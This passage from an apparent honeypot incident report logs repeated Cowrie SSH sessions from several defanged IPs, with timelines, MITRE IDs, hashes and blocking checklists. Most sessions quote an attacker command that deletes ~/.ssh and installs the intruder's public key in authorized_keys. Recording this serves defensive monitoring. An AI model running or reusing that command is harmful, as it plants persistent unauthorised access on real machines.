| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:55:06` | `cowrie.session.connect` |
| `2026-06-02 22:55:06` | `cowrie.client.version` |
| `2026-06-02 22:55:06` | `cowrie.client.kex` |
| `2026-06-02 22:55:07` | `cowrie.login.success` |
| `2026-06-02 22:55:07` | `cowrie.session.params` |
| `2026-06-02 22:55:07` | `cowrie.command.input` |
| `2026-06-02 22:55:07` | `cowrie.command.failed` |
| `2026-06-02 22:55:07` | `cowrie.log.closed` |
| `2026-06-02 22:55:08` | `cowrie.session.params` |
| `2026-06-02 22:55:08` | `cowrie.command.input` |
| `2026-06-02 22:55:08` | `cowrie.session.file_download` |
| `2026-06-02 22:55:08` | `cowrie.log.closed` |
| `2026-06-02 22:55:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac0df8db9992

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-02 22:55 |
| **Last Seen** | 2026-06-02 22:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:55:10` | `cowrie.session.connect` |
| `2026-06-02 22:55:10` | `cowrie.client.version` |
| `2026-06-02 22:55:10` | `cowrie.client.kex` |
| `2026-06-02 22:55:11` | `cowrie.login.success` |
| `2026-06-02 22:55:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0645651df986

| Field | Detail |
|---|---|
| **Source IP** | `103.171.69[.]82` |
| **First Seen** | 2026-06-02 22:57 |
| **Last Seen** | 2026-06-02 22:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:57:07` | `cowrie.session.connect` |
| `2026-06-02 22:57:07` | `cowrie.client.version` |
| `2026-06-02 22:57:07` | `cowrie.client.kex` |
| `2026-06-02 22:57:07` | `cowrie.login.success` |
| `2026-06-02 22:57:07` | `cowrie.session.params` |
| `2026-06-02 22:57:07` | `cowrie.command.input` |
| `2026-06-02 22:57:07` | `cowrie.command.failed` |
| `2026-06-02 22:57:08` | `cowrie.log.closed` |
| `2026-06-02 22:57:08` | `cowrie.session.params` |
| `2026-06-02 22:57:08` | `cowrie.command.input` |
| `2026-06-02 22:57:08` | `cowrie.session.file_download` |
| `2026-06-02 22:57:08` | `cowrie.log.closed` |
| `2026-06-02 22:57:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.69[.]82` to AbuseIPDB if not already reported
- [ ] Block `103.171.69[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9424a17bf7fc

| Field | Detail |
|---|---|
| **Source IP** | `103.171.69[.]82` |
| **First Seen** | 2026-06-02 22:57 |
| **Last Seen** | 2026-06-02 22:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:57:09` | `cowrie.session.connect` |
| `2026-06-02 22:57:09` | `cowrie.client.version` |
| `2026-06-02 22:57:09` | `cowrie.client.kex` |
| `2026-06-02 22:57:09` | `cowrie.login.success` |
| `2026-06-02 22:57:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.69[.]82` to AbuseIPDB if not already reported
- [ ] Block `103.171.69[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-021fcdd97c49

| Field | Detail |
|---|---|
| **Source IP** | `103.171.69[.]82` |
| **First Seen** | 2026-06-02 22:59 |
| **Last Seen** | 2026-06-02 22:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:59:24` | `cowrie.session.connect` |
| `2026-06-02 22:59:24` | `cowrie.client.version` |
| `2026-06-02 22:59:24` | `cowrie.client.kex` |
| `2026-06-02 22:59:24` | `cowrie.login.success` |
| `2026-06-02 22:59:24` | `cowrie.session.params` |
| `2026-06-02 22:59:24` | `cowrie.command.input` |
| `2026-06-02 22:59:24` | `cowrie.command.failed` |
| `2026-06-02 22:59:24` | `cowrie.log.closed` |
| `2026-06-02 22:59:24` | `cowrie.session.params` |
| `2026-06-02 22:59:24` | `cowrie.command.input` |
| `2026-06-02 22:59:25` | `cowrie.session.file_download` |
| `2026-06-02 22:59:25` | `cowrie.log.closed` |
| `2026-06-02 22:59:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.69[.]82` to AbuseIPDB if not already reported
- [ ] Block `103.171.69[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5a352dcf53e

| Field | Detail |
|---|---|
| **Source IP** | `103.171.69[.]79` |
| **First Seen** | 2026-06-02 22:59 |
| **Last Seen** | 2026-06-02 22:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:59:26` | `cowrie.session.connect` |
| `2026-06-02 22:59:26` | `cowrie.client.version` |
| `2026-06-02 22:59:26` | `cowrie.client.kex` |
| `2026-06-02 22:59:26` | `cowrie.login.success` |
| `2026-06-02 22:59:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.69[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.171.69[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-508de230354a

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-02 23:01 |
| **Last Seen** | 2026-06-02 23:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:01:28` | `cowrie.session.connect` |
| `2026-06-02 23:01:28` | `cowrie.client.version` |
| `2026-06-02 23:01:28` | `cowrie.client.kex` |
| `2026-06-02 23:01:29` | `cowrie.login.success` |
| `2026-06-02 23:01:29` | `cowrie.session.params` |
| `2026-06-02 23:01:29` | `cowrie.command.input` |
| `2026-06-02 23:01:29` | `cowrie.command.failed` |
| `2026-06-02 23:01:29` | `cowrie.log.closed` |
| `2026-06-02 23:01:30` | `cowrie.session.params` |
| `2026-06-02 23:01:30` | `cowrie.command.input` |
| `2026-06-02 23:01:30` | `cowrie.session.file_download` |
| `2026-06-02 23:01:30` | `cowrie.log.closed` |
| `2026-06-02 23:01:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2f6a549bb4f

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-02 23:01 |
| **Last Seen** | 2026-06-02 23:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:01:32` | `cowrie.session.connect` |
| `2026-06-02 23:01:32` | `cowrie.client.version` |
| `2026-06-02 23:01:32` | `cowrie.client.kex` |
| `2026-06-02 23:01:33` | `cowrie.login.success` |
| `2026-06-02 23:01:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc1b6d60412c

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-02 23:03 |
| **Last Seen** | 2026-06-02 23:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:03:02` | `cowrie.session.connect` |
| `2026-06-02 23:03:02` | `cowrie.client.version` |
| `2026-06-02 23:03:02` | `cowrie.client.kex` |
| `2026-06-02 23:03:02` | `cowrie.login.success` |
| `2026-06-02 23:03:03` | `cowrie.session.params` |
| `2026-06-02 23:03:03` | `cowrie.command.input` |
| `2026-06-02 23:03:03` | `cowrie.command.failed` |
| `2026-06-02 23:03:03` | `cowrie.log.closed` |
| `2026-06-02 23:03:03` | `cowrie.session.params` |
| `2026-06-02 23:03:03` | `cowrie.command.input` |
| `2026-06-02 23:03:03` | `cowrie.session.file_download` |
| `2026-06-02 23:03:03` | `cowrie.log.closed` |
| `2026-06-02 23:03:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3f3bfb2604b

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-02 23:03 |
| **Last Seen** | 2026-06-02 23:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:03:06` | `cowrie.session.connect` |
| `2026-06-02 23:03:06` | `cowrie.client.version` |
| `2026-06-02 23:03:06` | `cowrie.client.kex` |
| `2026-06-02 23:03:07` | `cowrie.login.success` |
| `2026-06-02 23:03:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d196004f50f

| Field | Detail |
|---|---|
| **Source IP** | `86.98.113[.]226` |
| **First Seen** | 2026-06-02 23:03 |
| **Last Seen** | 2026-06-02 23:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:03:20` | `cowrie.session.connect` |
| `2026-06-02 23:03:20` | `cowrie.client.version` |
| `2026-06-02 23:03:20` | `cowrie.client.kex` |
| `2026-06-02 23:03:20` | `cowrie.login.success` |
| `2026-06-02 23:03:20` | `cowrie.session.params` |
| `2026-06-02 23:03:20` | `cowrie.command.input` |
| `2026-06-02 23:03:20` | `cowrie.command.failed` |
| `2026-06-02 23:03:20` | `cowrie.log.closed` |
| `2026-06-02 23:03:20` | `cowrie.session.params` |
| `2026-06-02 23:03:20` | `cowrie.command.input` |
| `2026-06-02 23:03:20` | `cowrie.session.file_download` |
| `2026-06-02 23:03:20` | `cowrie.log.closed` |
| `2026-06-02 23:03:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.98.113[.]226` to AbuseIPDB if not already reported
- [ ] Block `86.98.113[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fe1e31a0560

| Field | Detail |
|---|---|
| **Source IP** | `86.98.113[.]226` |
| **First Seen** | 2026-06-02 23:03 |
| **Last Seen** | 2026-06-02 23:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:03:22` | `cowrie.session.connect` |
| `2026-06-02 23:03:22` | `cowrie.client.version` |
| `2026-06-02 23:03:22` | `cowrie.client.kex` |
| `2026-06-02 23:03:22` | `cowrie.login.success` |
| `2026-06-02 23:03:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.98.113[.]226` to AbuseIPDB if not already reported
- [ ] Block `86.98.113[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca10f8f05086

| Field | Detail |
|---|---|
| **Source IP** | `86.98.113[.]226` |
| **First Seen** | 2026-06-02 23:05 |
| **Last Seen** | 2026-06-02 23:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:05:41` | `cowrie.session.connect` |
| `2026-06-02 23:05:41` | `cowrie.client.version` |
| `2026-06-02 23:05:41` | `cowrie.client.kex` |
| `2026-06-02 23:05:41` | `cowrie.login.success` |
| `2026-06-02 23:05:41` | `cowrie.session.params` |
| `2026-06-02 23:05:41` | `cowrie.command.input` |
| `2026-06-02 23:05:41` | `cowrie.command.failed` |
| `2026-06-02 23:05:41` | `cowrie.log.closed` |
| `2026-06-02 23:05:41` | `cowrie.session.params` |
| `2026-06-02 23:05:41` | `cowrie.command.input` |
| `2026-06-02 23:05:41` | `cowrie.session.file_download` |
| `2026-06-02 23:05:41` | `cowrie.log.closed` |
| `2026-06-02 23:05:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.98.113[.]226` to AbuseIPDB if not already reported
- [ ] Block `86.98.113[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1889c3959e33

| Field | Detail |
|---|---|
| **Source IP** | `86.98.113[.]226` |
| **First Seen** | 2026-06-02 23:05 |
| **Last Seen** | 2026-06-02 23:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:05:44` | `cowrie.session.connect` |
| `2026-06-02 23:05:44` | `cowrie.client.version` |
| `2026-06-02 23:05:44` | `cowrie.client.kex` |
| `2026-06-02 23:05:44` | `cowrie.login.success` |
| `2026-06-02 23:05:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.98.113[.]226` to AbuseIPDB if not already reported
- [ ] Block `86.98.113[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af7ec4a508d5

| Field | Detail |
|---|---|
| **Source IP** | `87.106.29[.]151` |
| **First Seen** | 2026-06-02 23:06 |
| **Last Seen** | 2026-06-02 23:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:06:27` | `cowrie.session.connect` |
| `2026-06-02 23:06:27` | `cowrie.client.version` |
| `2026-06-02 23:06:27` | `cowrie.client.kex` |
| `2026-06-02 23:06:28` | `cowrie.login.success` |
| `2026-06-02 23:06:28` | `cowrie.session.params` |
| `2026-06-02 23:06:28` | `cowrie.command.input` |
| `2026-06-02 23:06:28` | `cowrie.command.failed` |
| `2026-06-02 23:06:28` | `cowrie.log.closed` |
| `2026-06-02 23:06:28` | `cowrie.session.params` |
| `2026-06-02 23:06:28` | `cowrie.command.input` |
| `2026-06-02 23:06:28` | `cowrie.session.file_download` |
| `2026-06-02 23:06:28` | `cowrie.log.closed` |
| `2026-06-02 23:06:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.29[.]151` to AbuseIPDB if not already reported
- [ ] Block `87.106.29[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70af3fb32388

| Field | Detail |
|---|---|
| **Source IP** | `87.106.29[.]151` |
| **First Seen** | 2026-06-02 23:06 |
| **Last Seen** | 2026-06-02 23:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:06:31` | `cowrie.session.connect` |
| `2026-06-02 23:06:31` | `cowrie.client.version` |
| `2026-06-02 23:06:31` | `cowrie.client.kex` |
| `2026-06-02 23:06:31` | `cowrie.login.success` |
| `2026-06-02 23:06:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.29[.]151` to AbuseIPDB if not already reported
- [ ] Block `87.106.29[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82dfefce357c

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-02 23:07 |
| **Last Seen** | 2026-06-02 23:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:07:48` | `cowrie.session.connect` |
| `2026-06-02 23:07:48` | `cowrie.client.version` |
| `2026-06-02 23:07:49` | `cowrie.client.kex` |
| `2026-06-02 23:07:49` | `cowrie.login.success` |
| `2026-06-02 23:07:50` | `cowrie.session.params` |
| `2026-06-02 23:07:50` | `cowrie.command.input` |
